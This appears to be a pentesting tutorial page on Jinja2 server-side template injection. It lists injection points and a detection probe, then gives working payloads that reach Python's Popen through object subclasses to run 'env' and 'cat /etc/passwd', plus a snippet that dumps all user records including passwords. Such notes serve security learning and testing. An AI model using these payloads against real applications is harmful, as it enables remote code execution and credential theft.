---
description: Jinja2 Server Side Template Injection
---

# Jinja2 SSTI

{% embed url="https://www.youtube.com/watch?v=Ffeco5KB73I" %}

### <mark style="color:yellow;">What are templates?</mark>

A **template** is a file or string that contains both static text and special placeholders that get replaced with real data when generating the final content.

#### We can have a template like:

```python
Hello {{ name }}!
```

With `name = "Alice"`, it becomes:

```python
Hello Alice!
```

{% hint style="warning" %}
Jinja2 is a popular template engine used in Python web applications. It offers great flexibility and powerful features for rendering templates. However, if user input is not properly validated and escaped, Jinja2 can be vulnerable to Server-Side Template Injection (SSTI) attacks.
{% endhint %}

### <mark style="color:yellow;">Looking for injection points</mark>

| Entry point       | Description                                                                           |
| ----------------- | ------------------------------------------------------------------------------------- |
| User Input Fields | Inputs like textboxes, search bars, or comment sections where users can enter data.   |
| URL parameters    | Values passed in the URL query string or as part of the path that can be manipulated. |
| HTTP-Header       | Headers such as `User-Agent` or `Referer` that may contain user-supplied data.        |
| Cookies           | Data stored in browser cookies that users can tamper with.                            |
| Form Data         | Data submitted through web forms that might be used in templates.                     |
| File Uploads      | Uploaded files that may be processed by the template engine, posing a security risk.  |
| Database Queries  | Dynamic content retrieved from the database that could include unsafe user input.     |

For the Jinja templates check for vulnerablity with `{{7*'7'}}`  , if the output show 49 its vulnerable.

### <mark style="color:yellow;">SSTI Exploration</mark>

Server Side Template Injections (SSTI) vulnerabilities can happen when an attacker can modify the template code before it being rendered by the template engine. When running in sandboxed enviroments and keywords are blocked we can still check for:

* `{{ dict }}`: Class object of the dictionary.
* `{{ request }}`: Object containing request information.
* `{{ config }}`:&#x20;

In python variables are objects and those objects internal functions, they start with \_\_ and end with \_\_. If you would look at the `int` functions with `dir()` like `dir(int(0))` you will see:

* `__add__` — used when you do `1 + 2`
* `__str__` — used when you do `str(5)` (for printing)
* `__repr__` — used for representing the object in code (`repr(5)`)

#### Using classes like Popen to execute code

In case of using editor print like&#x20;

```python
print(render_template_string("{{ [].__class__.__base__.__subclasses__()[317]('env', shell=True, stdout=-1).communicate()[0].strip() }}"))
```

```python
# Check base class
{{ [].__class__.__base__ }}

# List sublasses
{{ [].__class__.__base__.__subclasses__() }}

# Return class of index
{{ [].__class__.__base__.__subclasses__()[422] }}

# If you found index of subclass.Popen, call it and get RCE.
{{ [].__class__.__base__.__subclasses__()[422](‘cat /etc/passwd’,shell=True,stdout=-1).communicate()[0].strip() }}
```

### <mark style="color:yellow;">Acces database</mark>

Not SSTI specific but with python get users and passwords

```python
for user in User.query.all():
    print(user.__dict__)
```
